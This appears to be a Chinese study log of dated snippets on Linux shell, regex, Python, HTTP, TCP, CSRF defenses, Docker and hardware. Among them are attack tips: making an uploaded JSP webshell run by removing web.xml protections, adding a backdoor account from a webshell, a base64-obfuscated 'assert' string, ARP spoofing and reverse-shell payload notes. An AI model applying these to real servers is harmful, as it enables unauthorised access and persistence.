星号*：匹配它前面的字符串或正则表达式任意次（包括0次）。比如，“1122*”将匹配11+1个或多个2，其可能匹配的字符串将是112、1122、1122222、11223343等。
句点：匹配除换行符之外的任意一个字符。比如，“112.”将匹配112+至少一个字符，其可能匹配的字符串是1121、1122、112abc等，但不匹配112。
插入符号^：匹配一行的开始，但有时依赖于上下文环境，可能表示否定正则表达式中一个字符串的意思。比如，“^abc”将只匹配行首的abc字符串。
美元符$：在一个正则表达式的末尾，匹配一行的结尾。比如，“123$”将只匹配行尾的123，“^$”将匹配一个空行。
方括号[]：匹配方括号内指定的字符集中的一个字符。比如，“[abc]”将匹配字符a、b、c中的任意一个字符，“[a-h]”将匹配从a～h的任意一个字符，“[A-Z][a-z]”将匹配任意一个大写或小写字母，“[^a-d]”将匹配除a～d之外的所有字符。
反斜线符号\：转义一个特殊的字符，使这个字符得到字面意义的解释。比如，“\$”将表示回它的原意“$”，而不是表示行尾的正则表达式含义。类似地，“\\”表示的字意是“\”。
转义尖括号\<\>：用于标记单词边界。尖括号必须是转义的，否则它们只有字符的字面含义。比如，“\<the\>”匹配单词“the”，但不匹配“them”、“there”、“other”等等。

扩展正则表达式，在上面的基本正则表达式的元字符的基础上又增加了几个元字符，如下所示。
问号?：匹配0个或1个前面的字符，它通常用于匹配单个字符。比如，“ab?c”将匹配“ac”或“abc”。
加号+：匹配1个或多个前面的字符，它和星号*的作用相似，但它不匹配0个字符的情况。比如，“ab+c”将匹配“abc”、“abbc”、“abbb…c”等。
转义波形括号\{\}：指示匹配前面正则表达式的次数。波形括号必须是转义的，否则它们只有字符的字面含义。比如“[0-9]\{5\}”将匹配5位数字。
圆括号()：包含一组正则表达式。它们与下面要讲的“|”操作符一起使用，或是在使用expr提取子字符串时使用。竖线|：正则表达式的“或”操作符匹配一组可选的字符。比如“a(b|c)d”将匹配“abd”或“acd”。
```

### 2017年11月2日

```
chmod 什么时候使用字母，什么时候使用数字？
chmod u+x file 给当前用户添加执行权限，多脚本场景，可快速指定权限的时候，也就是你想给当前用户赋予权限的时候可省去思考其他人权限并计算数字的过程。
但面对同时给ugo赋予不同权限时，此方法gg
因为不能chmod u+x g+w file 
这个时候就需要使用数字，即chmod xxx file
➜  ~ chmod ug+x 2.txt 
➜  ~ l 2.txt 
-rwxr-xr-- 1 root root 35 Oct 31 03:51 2.txt
➜  ~ chmod u-x g+w 2.txt 
chmod: cannot access 'g+w': No such file or directory
➜  ~ chmod 674 2.txt
➜  ~ l 2.txt 
-rw-rwxr-- 1 root root 35 Oct 31 03:51 2.txt
```

### 2017年11月1日

kill -9 -1

关掉当前用户所有进程，直接gg 

多对付AWD中的不死马

### 2017年10月27日

```
JSP webshell执行403错误
上传了JSP的webshell成功后不能被执行，比如报403错误。通常这类报错是因为web.xml设置了禁止直接访问JSP文件。

比如下面是struts2的中的默认web.xml的配置：

<?xml version="1.0" encoding="UTF-8"?>
<web-app id="WebApp_9" version="2.4" xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">

    <display-name>Struts Blank</display-name>

    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
    </filter>

    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

    <welcome-file-list>
        <welcome-file>index.html</welcome-file>
    </welcome-file-list>

    <!-- Restricts access to pure JSP files - access available only via Struts action -->
    <security-constraint>
        <display-name>No direct JSP access</display-name>
        <web-resource-collection>
            <web-resource-name>No-JSP</web-resource-name>
            <url-pattern>*.jsp</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <role-name>no-users</role-name>
        </auth-constraint>
    </security-constraint>

    <security-role>
        <description>Don't assign users to this role</description>
        <role-name>no-users</role-name>
    </security-role>

</web-app>

解决方法是：注释或者删除web.xml中的以下防护配置

    <!-- Restricts access to pure JSP files - access available only via Struts action -->
    <security-constraint>
        <display-name>No direct JSP access</display-name>
        <web-resource-collection>
            <web-resource-name>No-JSP</web-resource-name>
            <url-pattern>*.jsp</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <role-name>no-users</role-name>
        </auth-constraint>
    </security-constraint>
```

### 2017年10月26日

ARP欺骗关键

```
假设同一交换机下有三台机器,分别为 A , B , C,正常情况下B和C的通信数据,A是不可能看到的
但在ARP缓存表机制中存在一个缺陷,就是当请求主机收到ARP应答包后,不会去验证自己是否向对方主机发送过ARP请求
就直接就把这个应答包中的IP与MAC地址的对应关系更新到自己本地的ARP缓存表中,这时就直接导致原有IP的对应关系被恶意替换
通俗点儿理解,也就是说,我强制刷新了对方的arp缓存对应关系,把原来ip的指向现在换成了我自己的地址
导致现在B和C的通信都要先经过A,那么,我们在A上自然就可以顺利的看到C和B之间的所有明文通信数据,即实现了所谓的监听
```

### 2017年10月21日

在Linux下，默认端口1024下的程序是要在root下才能使用的，在其他用户下，如果尝试使用将会报错。

### 2017年10月19日

```
对于运维工作者来说，可能最让人担心的，是服务器宕机；
最让人无助的，是被DDOS；
而最让人心惊肉跳的，是rm -rf 这个命令……
当你执行rm -rf命令时，万一哪个变量没赋值
听说过被删空服务器么？
mysql数据库不是在运行吗?
linux能删除正在执行的文件?反正是彻底删除了……
那一夜，你没有拒绝我……
那一夜，我心儿破碎……
我们平时工作中，rm -rf 这个命令给每个使用linux系统的工程师带来了深深的恐惧。
```

### 2017年10月19日

```
若电脑正在连接WiFi热点上网，此时还能用免费WiFi分享热点吗？
答：在Windows XP下电脑无线网卡通常仅支持单向接入，即只能接收WiFi信号或只能分享热无线网卡，但是在Windows 7及以上操作系统中可以同时使用WiFi热点上网，并共享无线WiFi。
```

### 2017年10月19日

```
引用符号、名称及其意义

" "	双引号
引用除美元符号（$）、反引号（`）和反斜线（\）之外的所有字符

' '	单引号	
引用所有的字符

``	反引号	
Shell将反引号中的内容解释为系统命令

\	反斜线	
转义符，屏蔽下一个字符的特殊意义

变量命令替换:
命令替换是指将命令的标准输出作为值赋给某个变量。一种是使用反引号，另一种是利用$()，并且$(可以嵌套使用)。
反引号和$()在处理双斜线\\时是有区别的，反引号将反双斜线处理为空格，$()将反双斜线处理为单斜线。

~ HI="hello world"                                       
➜  ~ echo "aaaaaaa $HIbbbbbbbb"                             aaaaaaa
➜  ~ echo "aaaaaaa ${HI}bbbbbbbb"                           aaaaaaa hello worldbbbbbbbb
```

### 2017年10月17日

```
Ctrl+w 清除一个单词
Ctrl+u 清除当前输入的命令
ESC+t 调换前后两个单词

Ctrl+d 中断
Ctrl+c 停止
```

### 2017年9月21日

```
需要熟记的一些http请求方法:

GET     向服务器请求url中所标识的资源,有时候还会在要请求的资源上附带一些参数,供脚本到数据库去增删改查
POST    在向服务器请求资源的同时附加一些新的数据在消息主体中。常用于各种表单提交,比如:上传,登录/注册,留言板,凡是有大量数据提交的地方基本都会用到
HEAD    只返回响应头
PUT     尝试向服务器请求存储一个指定资源,如,webdav的写漏洞
MOVE	向服务器请求移动某个资源
COPY	向服务器请求拷贝某个资源
DELETE  向服务器请求删除url指定的资源
OPTIONS 通过此方法可帮助我们查询服务器支持哪些请求方法。通常,我们可以直接用这种方式来探测目标服务器是否支持一些高危方法 例如:put,delete,move,copy
```

### 2017年9月17日

```
reverse_tcp：攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经连接。
bind_tcp：攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入。
```

### 2017年9月6日

linux 查看当前用户及用户所属组别

```
还有last、whoami、w都可以查看当前用户
hostname查看服务器主机名

查看当前登陆的用户
$ who
loongson tty7         2012-04-27 08:58 (:0)
loongson pts/0        2012-04-27 09:00 (:0.0)
loongson pts/1        2012-04-27 09:00 (:0.0)
loongson pts/2        2012-04-27 09:15 (:0.0)

$ finger
Login     Name       Tty      Idle  Login Time   Office     Office Phone
loongson  loongson   tty7       12  Apr 27 08:58 (:0)
loongson  loongson   pts/0       4  Apr 27 09:00 (:0.0)
loongson  loongson   pts/1          Apr 27 09:00 (:0.0)

查看用户的信息
$ finger loongson
Login: loongson                   Name: loongson
Directory: /home/loongson               Shell: /bin/bash
On since Fri Apr 27 08:58 (CST) on tty7 from :0
    13 minutes 52 seconds idle
On since Fri Apr 27 09:00 (CST) on pts/0 from :0.0
   5 minutes 50 seconds idle
On since Fri Apr 27 09:00 (CST) on pts/1 from :0.0
No mail.
No Plan

查看用户所属组别
$ groups loongson
loongson : loongson adm dialout cdrom plugdev lpadmin admin sambashare libvirtd
```

### 2017年9月6日

字符编码发展史和密码算法

```
（1）编码的故事讲了字符编码的发展史
ASCII捏造了常规字符；
gb系列融入了汉字；
Unicode统一编码；
UTF进行省流量传输；
XXUU，Base定义更少字符编码
（2）密码学系列介绍了密码算法的作用：
古典密码算法思路简单，以查表加解密为主，安全性弱。
现代密码学旨在保证数据的机密性和完整性。
机密性算法涉及到密钥，对称首选AES，非对称有RSA和 ECC。
完整性算法优选是哈希，定长唯一不可逆，MD5，SHA-1不安全，SHA-2家族杠杠的。
校验算法计算简单，校验位存留在信息自身，Luhn和 CRC应用广泛。
为防止数字指纹被修改，引入带密钥的哈希算法HMAC，带密码的指纹更安全。
高冷的简短的对话，密钥应运而生，密钥协商我只认DH。
```

### 2017年9月6日

```
>>> map(lambda x:x+2,[i for i in range(10)])
[2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
 
>>> t = time.time()
>>> print '{:.1f} s'.format(t)
1502334771.9 s
 
>>> print('123','456')
123 456
 
>>> flag = 1
>>> flag += 1
>>> flag
2
 
Python queue模块的FIFO队列先进先出。 class queue.Queue(maxsize)
•queue.qsize() 返回队列的大小
•queue.empty() 如果队列为空，返回True,反之False
 
#!/usr/bin/env python
# -*- coding:utf-8 -*-
 
import sys
sys.argv[0]  target = sys.argv[1].lower()
sys.exit(0)
 
target.startswith('http') 开头存在返回True
import urlparse
host = urlparse.urlparse(target, 'http').hostname
等于host = urlparse.urlparse(target).netloc
 
python eping.py https://www.bodkin.ren
ParseResult(scheme='https', netloc='www.bodkin.ren', path='', params='', query='', fragment='')
可以分开提取
 
import platform
platform.system() != 'Windows'
 
import os
os.system('ping %s%s' % (param_count, host))
```

### 2017年8月28日

任何问题都可以加一个中间件来解决

### 2017年8月26日

```
CSRF的防御

1. 检查HTTP Referer字段是否同域
HTTP Referer 是header的一部分，当浏览器向服务端发送请求时，浏览器会带上Referer，用于告诉服务端请求的来源。一般来说，用户提交的站内请求的来源（也就是Referer字段）应该站内地址，当检测到非同域时，有理由怀疑用户受到了CSRF攻击。虽然这种方法简单又有效，但是！我觉得这种方法目前已经变得不是那么可靠了。原因有三：  
（1） 这种方法只能防御来自站外的CSRF，却无法防御来自站内的CSRF；
（2） 当从HTTPS站点发送请求到HTTP站点时，浏览器不发送Referer，即无法检测请求来源；
（3） 虽然JavaScript/ActionScript无法修改Referer，但是Referer可以在服务端被伪造，即可以被向可信站点A发送请求的危险站点B伪造，从而通过检查机制；  

2. 使用验证码
很易于理解，就是在用户进行操作时让用户输入验证码，确保是用户本人进行的操作，而不是第三方。然而这种方式会降低用户的使用体验，给用户带来不便；  

3. 限制Session Cookie的生存周期
即规定如果用户在一段时间内不进行任何操作，服务端就自动销毁Session，用户再次操作时需要重新登录才能继续操作。因为无法真正做到用户一关闭浏览器服务端就销毁Session，虽然可以在用户关闭浏览器时给服务端发送一个销毁Session的请求，但是当浏览器崩溃或被强制关闭时，销毁Session的请求无法发出，服务端就一直会保持着这个Session；

4. 使用一次性Token
这种方法可以说是目前最广泛使用的解决方案了。这里的Token是一个由数字、字母组成的随机值，每次生成的Token必须具有唯一性且不易被猜测到。
在用户登录后，服务端会生成一个一次性的Token，一般这个Token会保存在服务端返回给用户的页面中的一个隐藏域里。每次用户向服务端发送操作请求时会附带上这个Token，服务端也会验证这个Token是否和分发给用户的Token一致，如果请求中不存在Token或Token不正确，即判定这个请求为非法请求。这个解决方案的原理就是利用了浏览器的同源策略，即第三方无法通过AJAX等方式获取到Token值。当然了，显而易见这个Token不具备时效性。我们可以使用一个临时的作用在父子。
```

### 2017年8月26日

```
Cookie机制：一般来说，Cookie分发是通过扩展HTTP协议来实现的，服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的Cookie。然而纯粹的客户端脚本如JavaScript也可以生成Cookie。Cookie相当于由用户自己保存的一张纸，上面记载着用户的信息。比如用户名、密码等等。Cookie一般是由浏览器在后台自动发送给服务器的。浏览器会检查所有的Cookie，当某个Cookie的作用域大于或等于所要访问的资源的位置时，浏览器就会把这个Cookie附在请求资源的HTTP请求头上发送给服务器。可以说，这种方式是客户端（用户）在维持状态。  

Session机制：客户端请求服务端时，服务端会为客户端创建一个Session，并检查请求中是否包含Session ID。形象的来说，一个Session相当于是一张会员卡，上面除了一个卡号其他什么都没有。这个卡号就是Session ID。当存在Session ID时就检索出相应的Session。不存在则创建一个Session并生成一个Session ID。Session ID的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串。当一个用户拿着这张“会员卡”访问一个网站时，用户在网站上的有关信息和操作都会被记录在服务端的这张会员卡对应的卡号下。很明显，这种方式就是服务端在维持状态。而Session机制和Cookie机制又有什么联系呢？虽然Session机制中用户的状态由服务端来维持，但是，Session中的Session ID还是要用户自己来保管的，而一般来说，Session ID则以Cookie的形式保存在客户端。但这种方式有一个弊端就是如果客户端禁用了Cookie，那么Session机制将无法正常工作。解决这个问题有两种方法，一种是URL重写，简单的说就是将Session ID作为URL的附加信息或参数，通过URL来传递。另一种是将Session ID写在表单（Form）的隐藏域中，在表单提交时将Session ID一起提交上去。
```

### 2017年8月24日

```
1.长度
[web97@salewell97 ~]$ test='I love china'
[web97@salewell97 ~]$ echo ${#test}
12
${#变量名}得到字符串长度 

2.截取字串
[chengmo@localhost ~]$ test='I love china'
[chengmo@localhost ~]$ echo ${test:5}     
e china
[chengmo@localhost ~]$ echo ${test:5:10} 
e china
${变量名:起始:长度}得到子字符串

4.字符串替换
[chengmo@localhost ~]$ test='c:/windows/boot.ini'
[chengmo@localhost ~]$ echo ${test/\//\\}
c:\windows/boot.ini
[chengmo@localhost ~]$ echo ${test//\//\\}
c:\windows\boot.ini
${变量/查找/替换值} 一个“/”表示替换第一个，”//”表示替换所有,当查找中出现了：”/”请加转义符”\/”表示。

➜  ~ a='Y.X.N.z.Z.X.J0';printf ${a//./}|base64 -D
assert%   
```

### 2017年8月23日

```
位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)

一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。


 在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。  第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；  第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。完成三次握手，客户端与服务器开始传送数据.
```

### 2017年8月18日

```
一般在Webshell中，passwd这种交互式的命令无法执行，可以使用下面的命令进行非交互式的添加账户：
root@kali:~# useradd Go0s
root@kali:~# echo 'Go0s:123456' | chpasswd
```

### 2017年8月13日

```
让终端走ss的代理
export http_proxy=127.0.0.1:8080
8080是ss的http代理端口
```

### 2017年8月9日

```
Node.js是JavaScript的一种运行环境，是对Google V8引擎进行的封装。是一个服务器端的javascript的解释器。
包含关系，nodejs中含有npm，比如说你安装好nodejs，你打开cmd输入npm -v会发现出啊线npm的版本号，说明npm已经安装好。
引用大神的总结:
其实npm是nodejs的包管理器（package manager）。我们在node.js上开发时，会用到很多别人已经写好的javascript代码，如果每当我们需要别人的代码时，都根据名字搜索一下，下载源码，解压，再使用，会非常麻烦。于是就出现了包管理器npm。大家把自己写好的源码上传到npm官网上，如果要用某个或某些个，直接通过npm安装就可以了，不用管那个源码在哪里。并且如果我们要使用模块A，而模块A又依赖模块B，模块B又依赖模块C和D，此时npm会根据依赖关系，把所有依赖的包都下载下来并且管理起来。试想如果这些工作全靠我们自己去完成会多么麻烦！
```

### 2017年8月8日

```
什么是异常？
异常即是一个事件，该事件会在程序执行过程中发生，影响了程序的正常执行。
一般情况下，在Python无法正常处理程序时就会发生一个异常。
异常是Python对象，表示一个错误。
当Python脚本发生异常时我们需要捕获处理它，否则程序会终止执行。
异常处理
捕捉异常可以使用try/except语句。
try/except语句用来检测try语句块中的错误，从而让except语句捕获异常信息并处理。
如果你不想在异常发生时结束你的程序，只需在try里捕获它。
语法：try....except...else
```

### 2017年8月8日

```
Here Document 是在Linux Shell 中的一种特殊的重定向方式
cat << EOF >>php.txt
```

### 2017年10月3日

```
默认情况下uniq只会检索相邻的重复数据从而去重
所以要配合sort先排序，再利用uniq去重，最后记得>导到文件中
sort php.txt | uniq > php.txt
```

### 2017年8月5日

```
chmod 对所有文件644 所有文件夹755

find * -type d | xargs chmod 755
find * -type f | xargs chmod 644

如果报错：xargs: unterminated quote
find * -type f -exec chmod 644 "{}" \;
```

### 2017年8月1日

```
1、配置（处理器、内存、显卡、硬盘、屏幕）
买电脑的时候，处理器这个是重点，现在市面的卖处理器的就两家， intel的 （i3 i5 i7)和AMD（A4 A6 A8 A10) 的，就我个人而言，新生买本本，还是选择因特尔的好，AMD水略深。
处理器，这个在电脑（键盘膜）右下角都可以看到的处理器贴纸。 因为现在电子产品更新的太快，现在都出到第七代处理器了，所以还是要考大家自己选择，日常使用的话，第五代和第七代也没啥差别，基本就换了框架或者是其它的东西。以下重点：怎么看处理器？  大家看到i5或者i7这样的标志就可以（AMD的忽略），先看看配置，点一下桌面的“计算机”图标 win10这叫“此电脑” 右键属性，你就可以看到处理器是什么型看看处理器那里是什么？ i5 5200U 还是 i5 6200u 5开头的就是代表第五代处理器，6开头的就是代表第六代处理器。U代表低压，有点是省电，缺点就是玩大型游戏估计有点吃力！注意是大型游戏，一半的游戏还是hold的住的。 M是标压，现在基本都看不到了，H是标压高性能，比标压性能好一点，HQ代表的是四核处理器，真四核哦，。2333333 处理器就可以这样选择，一般I5足以了。
内存， 现在市场是都是4G起步，所以没啥说的， 如果你是做设计的 PS啊 AE之类的，计算机码农的，建议你把内存加大8G 现在网上卖4G的内存也就120左右。也不贵，自己加内存也简单，不是很难。
显卡，个人认为这个是重头戏，你买了什么样的显卡决定你能玩什么游戏？显卡也有两个厂商 英伟达简称N卡和AMD的显卡，简称A卡，注意AMD的显卡也不差哈，不要以为AMD的处理器差，就认为AMD的显卡差，并不是这样。显卡的命名规则N卡的 ，前缀GTX>GT GTX比GT好，然后同等前缀就看后面的第二个数字， GT940>GT930>gt920 酱紫。 第二位数越高性能越好. GTX960>GTX950>GT940，GTX定义为游戏显卡， GT为家用，但是GT开头的显卡基本也能hold的住的，LOL之类都无压力。A卡，缀R9> R5>R3 前缀一样就看后面第二个位数 比如 R5 335>R5 315这样。 R3家用，R5性能就，R9 顶级。大家就酱紫 但是大家不要担心 基本的游戏，入门的基本都可以玩了。
还有一个就是显卡显存，现在动不动就是4G大显存，其实并没有什么卵用的，2G显寸就够了。4G显存，你买来也是用不上的，反而买4G显存价格还贵。
硬盘。硬盘又分机械硬盘和固态硬盘，现在电脑预装固态硬盘基本都很少的，预装了固态基本都要5K以上的。 机械硬盘就是普通的硬盘，咱们常用的500G啊 1T啊就是机械硬盘，这一类的硬盘存储容量大，但是速度慢，有响声。固态硬盘速度快，但是价格很贵，这个基本都是大家自己去买零售的，然后拆自己的电脑安装的，120G价钱都差不多300快了。 重点是速度很快，开机速度嗖嗖的。 用了固态你再也不想用机械了。
屏幕，现在又分普通的屏幕（1366× 768P）就是我们常用的，价格便宜，就是我们常用的，不清晰泛白之类的，但是一分钱一分货，这屏幕也就这样，还有就是高分屏（1920×1080p）的 但是配戴高分屏的，价格至少都是4.5K以上哦，清晰，看起来很爽舒服，看电视也超级爽，但是字体比较小。==
```

### 2017年7月30日

```
“水坑攻击”,黑客攻击方式之一，顾名思义,是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做法是,黑客分析攻击目标的上网活动规律,寻找攻击目标经常访问的网站的弱点,先将此网站“攻破”并植入攻击代码,一旦攻击目标访问该网站就会“中招”。
曾经发生过样的案例,黑客攻陷了某单位的内网,将内网上一个要求全体职工下载的表格偷偷换成了木马程序,这样,所有按要求下载这一表格的人都会被植入木马程序,向黑客发送涉密资料。
```

### 2017年7月30日

```
brew主要用来下载一些不带界面的命令行下的工具和第三方库来进行二次开发brew cask主要用来下载一些带界面的应用软件，下载好后会自动安装，并能在mac中直接运行使用举个例子，brew install curl可以安装curl第三方库，这样你在开发时就可以使用它的库来进行开发brew cask install chrome可以安装谷歌浏览器应用程序，可直接运行brew偏管理第三方库和命令行工具方面的东东brew cask可以看作是苹果官方app store的补充，是一个众多贡献者们维护的非苹果官方软件商店，你也可以在这里下mac软件用一些免费好用的mac软件没有在苹果官方app store商店上架，我们就可以在brew cask中下载。如果我要下载10个免费小软件，而这些软件没有在苹果商店上架，我们不需要一个一个去谷歌它们的官方网站，再去这些软件的官网去下载，我们统一在brew cask中下载。使用brew cask来进行包管理还有一个好处，这10个免费软件如果自身不带升级功能，但现在它们有更新，我只能去官网重新下载？不，直接在brew cask里就可以统一升级。这也是你问的那句“为何网路上跟推荐用brew cask呢？”的原因。如果安装mac图形界面软件，推荐先在苹果官方商店里搜索下载，没有的话去brew cask试试，如果还没有，只能去这个软件的官方网站去下载了。
```

### 2017年8月6日

```
1. /etc/profile （建议不修改这个文件 ） 
全局（公有）配置，不管是哪个用户，登录时都会读取该文件。 
2. /etc/bashrc （一的一般在这个文件中添加系统级环境变V量） 
全局（公有）配置，bash shell执行时，不管是何种方式，都会读取此文件。 
3. ~/.bash_profile （一般在这个文件中添加用户级环境变量） 
每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!
```

### 2017年7月22日

```
Mac下面的环境变量设置和Linux差不多，一般为这几个文件（左边的先加载）：

/etc/profile /etc/paths ~/.bash_profile ~/.bash_login ~/.profile ~/.bashrc

etc目录下面的是系统级的配置，~目录下的是用户配置，用户配置文件只会加载一个（.bashrc除外），不存在的可以自己新建；

添加／usr／bin进到环境变量中：
export PATH=$PATH:/usr/bin
```

### 2017年7月21日

```
watch  -n 10 sh  test.sh  &  
#每10s在后台执行一次test.sh脚本

watch命令以周期性的方式执行给定的指令，指令输出以全屏方式显示。

-n：指定指令执行的间隔时间（秒）

指令：需要周期性执行的指令。
```

### 2017年8月6日

```
${PATH:1:1}
如果冒号没了，可以用$(expr substr $PATH 1 1)
expr substr 截取字符串
区分好${}和$()

echo $(expr substr $PATH 1 1)
/

echo ${PATH:0:1}
/

echo $(PATH:1:1)
PATH:1:1: command not found

echo ${PATH:1:1}
h

shell编程给变量赋值并调用：
a='123';echo ${a};
```

### 2017年6月26日

```
ubuntu@VM-72-70-ubuntu:/var/www/wiki$ file * | grep text | cut -f1 -d ":" | xargs -I % bash -c "echo %;cat %"
cut -d ":" 以冒号作为分界符
-f1 取分界之后第一列
xargs -I {} 将传送来的值放到后面{}位置上
bash -c
sh -c
python -c
...都是外部执行命令
```

### 2017年7月1日

```
apt-get update && apt-get upgrade

apt-get是某些linux发行版使用的一个“包管理器”（还有别的发行版使用yum等，以及brew等其他平台上的包管理器，工作原理类似）。 包管理器的作用是从源（Source）服务器那里下载最新的软件包列表，然后在你需要安装某个软件包（apt-get install）的时候从列表里面查询这个软件包的版本信息、系统要求、翻译、依赖项（该软件正常运行必须安装的其它软件）并且添加到同时安装的列表里面，再查询所有安装列表里面的软件包的.deb文件下载地址，最后批量下载，自动分析安装顺序然后安装完成。 但是这个软件包列表是不会被自动下载的，需要用户使用apt-get update更新。这样，apt-get才能知道每个软件包的最新信息，从而正确地下载最新版本的软件。 

至于apt-get upgrade，则是对已经安装的软件包本身进行更新的过程。由于确定要更新的软件包需要对本地安装的版本和列表的版本进行比较，所以要在update以后运行这一条。 要求在install操作之前执行update和upgrade，实际上是确保本地软件列表信息和已安装软件均为最新的过程。这样做可以最大限度地确保新安装的软件包正常工作。 一般来说，update和upgrade不需要每次安装软件之前都运行，安装新软件的话一天左右运行一次即可，不安装软件的时候隔十天半个月运行一下来更新软件包，服务器系统如果没有安全性更新就别乱更新了，稳定最重要。 
PS：软件源服务器地址可以在/etc/apt/sources.list里面看到。
```

### 2017年7月1日

```
root@Go0s:~# df -m
Filesystem     1M-blocks  Used Available Use% Mounted on
udev                 225     0       225   0% /dev
tmpfs                 49     6        44  12% /run
/dev/vda1          20102  2254     16808  12% /
tmpfs                245     0       245   0% /dev/shm
tmpfs                  5     0         5   0% /run/lock
tmpfs                245     0       245   0% /sys/fs/cgroup
tmpfs                 49     0        49   0% /run/user/0

root@Go0s:~# fdisk -l
Disk /dev/vda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x2c8f0258

Device     Boot Start      End  Sectors Size Id Type
/dev/vda1  *     2048 41942917 41940870  20G 83 Linux


root@Go0s:~# free -m
              total        used        free      shared  buff/cache   available
Mem:            488          78         221           5         187         375
Swap:             0           0           0
```

### 2017年7月1日

```
http://blog.csdn.net/u014761344/article/details/40146597

有太多的文章告诉我们nginx uwsgi django 这些东西怎么用了，太多的人知道这些东西的怎么使用，怎么配置，怎么优化，但是还是有一部分人比如我这种水货不知道这些东西到底是啥，为啥一个项目的发布要经过这么多层级，他们每一层都做了什么，都是必须的吗

1 首先nginx 是对外的服务接口，外部浏览器通过url访问nginx,

2nginx 接收到浏览器发送过来的http请求，将包进行解析，分析url，如果是静态文件请求就直接访问用户给nginx配置的静态文件目录，直接返回用户请求的静态文件，

  如果不是静态文件，而是一个动态的请求，那么nginx就将请求转发给uwsgi,uwsgi 接收到请求之后将包进行处理，处理成wsgi可以接受的格式，并发给wsgi,wsgi 根据请求调用应用程序的某个文件，某个文件的某个函数，最后处理完将返回值再次交给wsgi,wsgi将返回值进行打包，打包成uwsgi能够接收的格式，uwsgi接收wsgi 发送的请求，并转发给nginx,nginx最终将返回值返回给浏览器。

3要知道第一级的nginx并不是必须的，uwsgi完全可以完成整个的和浏览器交互的流程，但是要考虑到某些情况

  1 安全问题，程序不能直接被浏览器访问到，而是通过nginx,nginx只开放某个接口，uwsgi本身是内网接口，这样运维人员在nginx上加上安全性的限制，可以达到保护程序的作用。

  2负载均衡问题，一个uwsgi很可能不够用，即使开了多个work也是不行，毕竟一台机器的cpu和内存都是有限的，有了nginx做代理，一个nginx可以代理多台uwsgi完成uwsgi的负载均衡。

  3静态文件问题，用django或是uwsgi这种东西来负责静态文件的处理是很浪费的行为，而且他们本身对文件的处理也不如nginx好，所以整个静态文件的处理都直接由nginx完成，静态文件的访问完全不去经过uwsgi以及其后面的东西。

这就是这几者之间的关系。
```

### 2017年7月21日

```
Linux在shell中命令执行：

ubuntu@VM-72-70-ubuntu:/var/www/wiki/dangdangip$ cat $(find . -name '*txt')
纬度 36.054812999999996经度 103.73144049999999   ------时间 是2017-06-25 23:07:48
 23:47:32
ubuntu@VM-72-70-ubuntu:/var/www/wiki/dangdangip$ cat `find . -name '*txt'`
纬度 36.054812999999996经度 103.73144049999999   ------时间 是2017-06-25 23:07:48

在 bash shell 中，$( ) 与 ` ` (反引号) 都是用来做命令替换用(command substitution)的。而 $( ) 并不见的每一种 shell 都能使用，若你用 bash2 的话，肯定没问题...
看 ${ } 吧... 它其实就是用来作变量替换用的啦。一般情况下，$var 与 ${var} 并没有啥不一样。但是用 ${ } 会比较精确的界定变量名称的范围。
```

### 2017年6月24日

Linux文件与目录的权限区别

[Linux文件与目录的权限区别.png](./src/Linux文件与目录的权限区别.png)

### 2017年6月24日

```
http://www.zslin.com/web/article/detail/56

本例子将通过快速搭建Wordpress+MySQL的网站来熟悉docker run命令及使用方法。

本着“容器只干一件事情”的原则，那本示例会将出现两个容器，一个Wordpress的网站程序的容器，另一个则是MySQL的数据库容器，在这个示例中将看到两个容器是如何协同工作的。

启动MySQL数据库容器

docker run -d --name wp-mysql -e MYSQL_ROOT_PASSWORD=123456 -p 3336:3306 mysql

说明：
docker run：启动容器的命令
-d：后台运行
--name wp-mysql：指定容器名称，这里设置为wp-mysql
-e：指定容器中的环境参数，这里初始化root用户的密码为123456
-p 3336:3306：对外映射容器内的端口号，这里将容器里的3306映射到外部可访问的3336端口。
mysql：被运行的镜像名称，这里是mysql的镜像

启动Wordpress容器

docker run -d --name my-wp --link wp-mysql:mysql -p 80:80 wordpress

说明：
docker run：启动容器的命令
-d：后台运行
--name my-wp：指定容器名称，这里是my-wp
--link wp-mysql:mysql：将名为wp-mysql的容器关联到现在启动容器内部的mysql，也就是在现在启动的容器内部可以通过mysql来访问wp-mysql数据库的功能。
-p 80:80：对外映射容器内的80端口
wordpress：被启动的wordpress镜像
查看Wordpress的日志

docker logs my-wp
说明：my-wp是刚刚设置的容器名称，通过这个命令可以查看Wordpress的启动情况。

访问网站

